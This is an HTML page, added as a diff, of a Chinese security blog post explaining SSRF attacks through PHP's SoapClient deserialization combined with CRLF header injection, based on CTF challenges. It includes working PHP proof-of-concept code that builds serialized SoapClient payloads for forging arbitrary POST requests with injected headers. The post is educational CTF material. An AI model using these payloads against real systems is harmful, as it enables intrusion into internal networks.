@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Lethe">
+
+
+    <meta name="subtitle" content="Life is a struggle">
+
+
+    <meta name="description" content="Lethe's Blog">
+
+
+    <meta name="keywords" content="Lethe's Blog">
+
+
+<title>利用SoapClient类进行SSRF+CRLF攻击 | Lethe&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">利用SoapClient类进行SSRF+CRLF攻击</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 6, 2019&nbsp;&nbsp;0:50:41</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/System-Security/">System Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>前一段时间在De1CTF中的ShellShellShell以及SUCTF的Upload labs2都涉及到了利用PHP的SoapClient类进行SSRF，因此在这里记录下。</p>
+<br>
+
+<h1 id="0x01-什么是Soap"><a href="#0x01-什么是Soap" class="headerlink" title="0x01 什么是Soap"></a>0x01 什么是Soap</h1><p>SOAP是webService三要素（SOAP、WSDL、UDDI）之一：</p>
+<ul>
+<li><p>WSDL 用来描述如何访问具体的接口。</p>
+</li>
+<li><p>UDDI用来管理，分发，查询webService。</p>
+</li>
+<li><p>SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。<br>其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</p>
+</li>
+</ul>
+<br>
+
+<h1 id="0x02-PHP中的SoapClient类"><a href="#0x02-PHP中的SoapClient类" class="headerlink" title="0x02 PHP中的SoapClient类"></a>0x02 PHP中的SoapClient类</h1><p>参考链接：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/soapclient.soapclient.php">https://www.php.net/manual/zh/soapclient.soapclient.php</a></p>
+<p>PHP 的 SOAP 扩展可以用来提供和使用 Web Services，这个扩展实现了6个类，其中的SoapClient类是用来创建soap数据报文，与wsdl接口进行交互的，同时这个类下也是有反序列化中常常用到的__call()魔术方法。</p>
+<p>该类的构造函数如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient （<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ]）</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数是用来指明是否是wsdl模式。</p>
+<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置<code>location</code>和<code>uri</code>选项，其中<code>location </code>是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/SSRF-CRLF-Attack-by-SoapClient/20190906000607209.png" alt="在这里插入图片描述"></p>
+<p>知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。</p>
+<p>我们可以设置第一个参数为<code>null</code>，然后第二个参数的<code>location</code>选项设置为<code>target_url</code>，如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&quot;http://xxx.xxx.xxx&quot;</span>,</span><br><span class="line">                                     <span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当把上述脚本得到的序列化串进行反序列化（unserialize），并执行一个SoapClient没有的成员函数时，会自动调用该类的<code>__Call</code>方法，然后向<code>target_url</code>发送一个soap请求，并且<code>uri</code>选项是我们可控的地方。</p>
+<br>
+
+<h1 id="0x03-CRLF-Injection"><a href="#0x03-CRLF-Injection" class="headerlink" title="0x03 CRLF Injection"></a>0x03 CRLF Injection</h1><p>CRLF是”回车 + 换行”<code>(\r\n)</code>的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
+<p>参考链接：<br><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">CRLF Injection漏洞的利用与实例分析</a></p>
+<br>
+
+<h1 id="0x04-SSRF-CRLF攻击内网"><a href="#0x04-SSRF-CRLF攻击内网" class="headerlink" title="0x04 SSRF+CRLF攻击内网"></a>0x04 SSRF+CRLF攻击内网</h1><p>实际上很多时候都需要这两个漏洞配合在一起使用，当我们我们可以从外网调用到soap的api，而攻击目标是在内网，那么就可以利用SoapClient进行SSRF攻击内网，然后配合CRLF构造POST请求增加我们的攻击面。</p>
+<p>那么为什么在用SoapClient类进行SSRF的时候会有CRLF注入的问题呢？如下：</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/SSRF-CRLF-Attack-by-SoapClient/20190906003122388.png" alt="在这里插入图片描述"></p>
+<p>可以看到options参数中还有一个选项为<code>user_agent</code>，运行我们自己设置<code>User-Agent</code>的值。</p>
+<p>当我们可以控制<code>User-Agent</code>的值时，也就意味着我们完全可以构造一个POST请求，因为<code>Content-Type</code>为和<code>Content-Length</code>都在<code>User-Agent</code>之下，而控制这两个是利用CRLF发送post请求最关键的地方。</p>
+<p>最后给出wupco师傅的生成任意POST报文的POC:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://123.206.216.198/bbb.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;a=b&amp;flag=aaa&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: xxxx=1234&#x27;</span></span><br><span class="line">    );</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&#x27;%0d%0a&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;%26&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<br>
+
+<br>
+
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://skysec.top/2018/08/17/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/#SOAP%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BCRLF%E4%B8%8ESSRF%EF%BC%88%E4%BA%8C%EF%BC%89">https://skysec.top/2018/08/17/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/#SOAP%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BCRLF%E4%B8%8ESSRF%EF%BC%88%E4%BA%8C%EF%BC%89</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2148#toc-0">https://xz.aliyun.com/t/2148#toc-0</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Lethe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://lethe.site/2019/09/06/SSRF-CRLF-Attack-by-SoapClient/">https://lethe.site/2019/09/06/SSRF-CRLF-Attack-by-SoapClient/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/09/11/ByteCTF-2019-XNUCA-2019-Web/">ByteCTF_2019&XNUCA_2019部分web题复现</a>
+            
+            
+            <a class="next" rel="next" href="/2019/09/01/Fifth-Space-Writeup-Web/">第五空间Writeup_Web</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Lethe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
